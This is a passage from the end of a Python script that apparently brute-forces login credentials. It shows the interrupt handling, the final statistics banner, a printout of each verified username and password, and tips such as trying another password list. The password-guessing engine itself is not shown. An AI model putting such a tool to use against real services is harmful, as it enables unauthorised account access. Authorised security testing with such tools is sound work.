        print(f"{WHITE}  Stopping all workers and cleaning up...{RESET}\n")
        
        engine.stop()
        progress.stop()
        time.sleep(1)
        
        stats = engine.get_stats()
        
        print(f"{CYAN}{BOLD}Partial Results:{RESET}\n")
        print(f"  {WHITE}Tests Completed:{RESET}  {stats['attempts']} / {total_combos}")
        print(f"  {WHITE}Valid Credentials:{RESET} {GREEN}{BOLD}{stats['successful']}{RESET}")
        print(f"  {WHITE}Failed Attempts:{RESET}  {stats['failed']}")
        print(f"  {WHITE}Average Speed:{RESET}    {stats['rate']:.2f} tests/second")
        
        if stats['successful'] > 0:
            print(f"\n{GREEN}[+] Results saved to: {args.output}{RESET}\n")
        
        sys.exit(1)
    
    # Stop progress display
    progress.stop()
    
    # Wait for all workers to finish
    engine.wait(timeout=5)
    
    # Final statistics
    stats = engine.get_stats()
    
    if not args.quiet:
        print(f"\n\n{CYAN}{BOLD}{'═' * 76}{RESET}")
        print(f"{CYAN}{BOLD}║{RESET}                        {BOLD}SECURITY TEST COMPLETED{RESET}                        {CYAN}{BOLD}║{RESET}")
        print(f"{CYAN}{BOLD}{'═' * 76}{RESET}")
        
        # Format statistics
        print(f"{CYAN}{BOLD}║{RESET}  {WHITE}Total Tests Performed:{RESET}     {str(stats['attempts']).ljust(44)} {CYAN}{BOLD}║{RESET}")
        print(f"{CYAN}{BOLD}║{RESET}  {WHITE}Valid Credentials Found:{RESET}   {GREEN}{BOLD}{str(stats['successful']).ljust(44)}{RESET} {CYAN}{BOLD}║{RESET}")
        print(f"{CYAN}{BOLD}║{RESET}  {WHITE}Failed Attempts:{RESET}           {str(stats['failed']).ljust(44)} {CYAN}{BOLD}║{RESET}")
        print(f"{CYAN}{BOLD}║{RESET}  {WHITE}Average Speed:{RESET}             {f'{stats['rate']:.2f} tests/second'.ljust(44)} {CYAN}{BOLD}║{RESET}")
        print(f"{CYAN}{BOLD}║{RESET}  {WHITE}Total Time:{RESET}                {ProgressDisplay._format_time(stats['elapsed']).ljust(44)} {CYAN}{BOLD}║{RESET}")
        print(f"{CYAN}{BOLD}{'═' * 76}{RESET}\n")
    
    # Display results
    if stats['successful'] > 0:
        print_success_banner(f"Found {stats['successful']} Valid Credential(s)")
        
        print(f"{WHITE}  The following credentials were successfully verified:{RESET}\n")
        
        for idx, (username, password) in enumerate(engine.valid_credentials, 1):
            print(f"  {GREEN}[{idx}]{RESET} {WHITE}Username:{RESET} {CYAN}{BOLD}{username:20s}{RESET}  {WHITE}Password:{RESET} {YELLOW}{BOLD}{password}{RESET}")
        
        print(f"\n{GREEN}{BOLD}  Results have been saved to: {args.output}{RESET}\n")
    else:
        print_warning_banner("No Valid Credentials Found")
        print(f"{WHITE}  None of the tested combinations were successful.{RESET}")
        print(f"\n{YELLOW}  Suggestions:{RESET}")
        print(f"{WHITE}  - Try a different password list{RESET}")
        print(f"{WHITE}  - Verify the service is running correctly{RESET}")
        print(f"{WHITE}  - Check if there are account lockout policies{RESET}\n")
    
    # Exit status
    sys.exit(0 if stats['successful'] > 0 else 1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}{'━' * 60}{RESET}")
        print(f"{YELLOW}  Operation cancelled by user.{RESET}")
        print(f"{YELLOW}{'━' * 60}{RESET}\n")
        sys.exit(1)
    except Exception as e:
        print_error_banner("Unexpected Error")
        print(f"{WHITE}  An unexpected error occurred:{RESET}")
        print(f"{RED}  {e}{RESET}\n")
        sys.exit(1)
